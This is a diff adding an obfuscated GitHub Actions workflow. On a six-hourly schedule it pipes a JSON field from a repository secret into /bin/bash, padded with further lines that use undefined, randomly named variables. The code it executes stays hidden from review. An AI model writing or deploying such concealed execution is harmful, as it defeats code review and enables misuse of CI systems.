@@ -1,0 +1,23 @@
+name: gongnvzz
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gongnvzz
+        env:
+          ewd3: ${{ secrets.ewd3 }}
+        run: |
+          echo $ewd3 | jq -r .a4 | /bin/bash
+          echo $tncm52406 | jq -r .nmgeu2784 | /bin/bash
+          echo $mj0 | jq -r .pqeg14361 | /bin/bash
+          echo $qcvu3 | jq -r .mgbg416 | /bin/bash
+          echo $bom7 | jq -r .wchu4027 | /bin/bash
+          echo $p52273 | jq -r .w817 | /bin/bash
+          echo $tsm84217 | jq -r .e800 | /bin/bash
+          echo $nogih31358 | jq -r .mnsmh2 | /bin/bash
+
